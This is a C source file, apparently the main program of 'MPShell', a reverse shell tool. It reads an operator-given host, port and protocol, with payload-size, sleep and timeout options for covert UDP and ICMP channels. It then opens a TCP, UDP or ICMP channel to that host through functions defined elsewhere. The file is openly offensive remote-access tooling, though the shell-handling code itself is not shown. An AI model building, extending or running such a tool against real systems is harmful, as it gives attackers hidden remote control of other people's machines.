#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <time.h>

#include "mpshell.h"

bool RUN                            = true;
char *host                          = NULL;
int port                            = -1;
int protocol                        = PROTOCOL_TCP;
uint16_t maxPayloadSize             = DEFAULT_MAX_PAYLOAD_SIZE;
useconds_t sleepSize                = DEFAULT_SLEEP;
time_t timeout                      = DEFAULT_TIMEOUT;

/* --------------------------------------------------------------------------------------------------------------- */

void signalHandler(int signum) { RUN = false; }

void showUsage()
{
    const char *additionalNotes = "\n" \
    "Note that --payload-size, --sleep and --timeout options are only used for UDP/ICMP.\n" \
    "--payload-size option doesn't include protocol (UDP|ICMP) header, or a reverse shell\n" \
    "payload header of 10 bytes.\n\n";

    printf("\nUSAGE: ./MPShell --host=192.68.0.13 --port=8080 [OPTIONS]\n\n");
    printf("Options:\n");
    printf("-------\n");
    printf("--protocol=tcp|udp|icmp\n");
    printf("%-40s%s\n", "--payload-size=1462",  "[bytes]");
    printf("%-40s%s\n", "--sleep=100",          "[milliseconds]");
    printf("%-40s%s\n", "--timeout=2",          "[seconds]");
    printf(additionalNotes);
    exit(1);
}

/* --------------------------------------------------------------------------------------------------------------- */

int main(int argc, const char *argv[])
{

    // Parsing command-line arguments
    // ------------------------------
    char delimiter[] = "=";
    for (int i = 1; i < argc; i++)
    {
        char *paramName  = NULL;
        char *paramValue = NULL;

        char *currentArgument = argv[i];
        paramName = strtok(currentArgument, delimiter);

        if (paramName != NULL)
            paramValue = strtok(NULL, delimiter);

        if (paramName != NULL && paramValue != NULL)
        {
            if (strcmp(paramName, "--host") == 0)               { host = paramValue; }
            else if (strcmp(paramName, "--port") == 0)          { port = atoi(paramValue); }
            else if (strcmp(paramName, "--protocol") == 0)
            {
                if (strcmp(paramValue, "tcp") == 0)             { protocol = PROTOCOL_TCP; }
                else if (strcmp(paramValue, "udp") == 0)        { protocol = PROTOCOL_UDP; }
                else if (strcmp(paramValue, "icmp") == 0)       { protocol = PROTOCOL_ICMP; }
                else { showUsage(); }
            }
            else if (strcmp(paramName, "--payload-size") == 0)  { maxPayloadSize = (size_t) atoi(paramValue); }
            else if (strcmp(paramName, "--sleep") == 0)         { sleepSize      = (useconds_t) (1000 * atoi(paramValue)); }
            else if (strcmp(paramName, "--timeout") == 0)       { timeout        = (time_t) (atoi(paramValue)); }
            else { showUsage(); }
        }
        else { showUsage(); }
    }


    // Validating arguments
    // --------------------
    if (host == NULL || strlen(host) == 0)                                                                      { showUsage(); }
    else if ((protocol != PROTOCOL_ICMP) && (port <= 0 || port > 65535))                                        { showUsage(); }
    else if ((protocol != PROTOCOL_TCP) && (sleepSize <= 0))                                                    { showUsage(); }
    else if ((protocol != PROTOCOL_TCP) && (timeout <= 0))                                                      { showUsage(); }
    else if ((protocol != PROTOCOL_TCP) && (maxPayloadSize <=0 || maxPayloadSize > DEFAULT_MAX_PAYLOAD_SIZE))   { showUsage(); }
    else
    {
        /* Install signal handler */
        signal(SIGINT, signalHandler);

        /* Open communication channel */
        switch (protocol)
        {
            case PROTOCOL_TCP:  openTCPChannel(host, port); break;
            case PROTOCOL_UDP:  openUDPChannel(host, port); break;
            case PROTOCOL_ICMP: openICMPChannel(host);      break;
        }
    }
}

/* --------------------------------------------------------------------------------------------------------------- */
